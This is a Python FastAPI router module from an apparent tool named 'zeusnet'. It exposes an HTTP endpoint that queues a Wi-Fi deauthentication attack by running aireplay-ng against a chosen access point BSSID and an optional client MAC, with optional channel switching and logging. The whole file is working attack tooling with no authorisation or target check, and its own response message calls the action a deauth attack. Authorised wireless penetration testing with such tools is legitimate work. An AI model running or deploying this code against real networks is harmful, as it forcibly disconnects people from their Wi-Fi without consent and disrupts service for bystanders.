import os
import subprocess
import logging
from fastapi import APIRouter, HTTPException, Query, BackgroundTasks
from typing import Optional
from pathlib import Path
import tempfile

router = APIRouter()
logger = logging.getLogger("zeusnet.aireplay")

# --- Use temp or local dir for logs; never require root ---
DEFAULT_LOG_BASE = Path(tempfile.gettempdir()) / "zeusnet" / "aireplay"
AIREPLAY_LOG_DIR = Path(
    os.environ.get("ZEUSNET_AIREPLAY_LOG_DIR", str(DEFAULT_LOG_BASE))
)
AIREPLAY_LOG_DIR.mkdir(parents=True, exist_ok=True)

AIREPLAY_BIN = "/usr/bin/aireplay-ng"  # Change as needed
AIREPLAY_IFACE = "wlan0mon"  # UI-configurable in real build


def run_aireplay_deauth(
    bssid, client_mac=None, channel=None, iface=AIREPLAY_IFACE, log_id=""
):
    cmd = [AIREPLAY_BIN, "--deauth", "10", "-a", bssid]
    if client_mac:
        cmd += ["-c", client_mac]
    if channel:
        try:
            subprocess.run(
                ["iwconfig", iface, "channel", str(channel)],
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except Exception as e:  # pragma: no cover - non-critical
            logger.warning("Failed to set channel %s on %s: %s", channel, iface, e)
    cmd.append(iface)

    log_file = AIREPLAY_LOG_DIR / f"deauth_{bssid.replace(':', '')}_{log_id}.log"
    logger.info(f"Executing: {' '.join(cmd)} | Log: {log_file}")

    try:
        with open(log_file, "w") as lf:
            result = subprocess.run(
                cmd, check=True, stdout=lf, stderr=subprocess.STDOUT, timeout=20
            )
            logger.info(
                f"Aireplay deauth completed: {bssid} result={result.returncode}"
            )
    except subprocess.CalledProcessError as e:
        logger.error(f"Aireplay failed: {e}")
        with open(log_file, "a") as lf:
            lf.write(f"\n[FAIL] {e}\n")
        raise
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        with open(log_file, "a") as lf:
            lf.write(f"\n[ERROR] {e}\n")
        raise


@router.get("/aireplay/test", tags=["Aireplay"])
def aireplay_test():
    return {"status": "aireplay module online", "msg": "Test successful."}


@router.post("/aireplay/deauth", tags=["Aireplay"])
def aireplay_deauth(
    background_tasks: BackgroundTasks,
    target_bssid: str = Query(..., description="Target BSSID (AP MAC address)"),
    client_mac: Optional[str] = Query(
        None, description="Client MAC address to target (optional)"
    ),
    channel: Optional[int] = Query(None, description="Wi-Fi channel (optional)"),
):
    if not Path(AIREPLAY_BIN).exists():
        raise HTTPException(
            status_code=500, detail=f"aireplay-ng binary not found at {AIREPLAY_BIN}"
        )
    if not target_bssid:
        raise HTTPException(status_code=400, detail="Missing BSSID")
    log_id = f"{target_bssid.replace(':','')}_{client_mac or 'all'}"
    try:
        AIREPLAY_LOG_DIR.mkdir(parents=True, exist_ok=True)
    except Exception as e:
        logger.error(f"Could not create log dir: {AIREPLAY_LOG_DIR}: {e}")
        raise HTTPException(
            status_code=500, detail=f"Cannot create log dir: {AIREPLAY_LOG_DIR}: {e}"
        )

    background_tasks.add_task(
        run_aireplay_deauth, target_bssid, client_mac, channel, AIREPLAY_IFACE, log_id
    )
    logger.info(
        f"Queued aireplay-ng deauth: bssid={target_bssid} client={client_mac} channel={channel}"
    )
    return {
        "status": "queued",
        "attack": "deauth",
        "bssid": target_bssid,
        "client": client_mac,
        "channel": channel,
        "msg": "Deauth attack queued and will run on the backend.",
        "logfile": str(
            AIREPLAY_LOG_DIR / f"deauth_{target_bssid.replace(':','')}_{log_id}.log"
        ),
    }
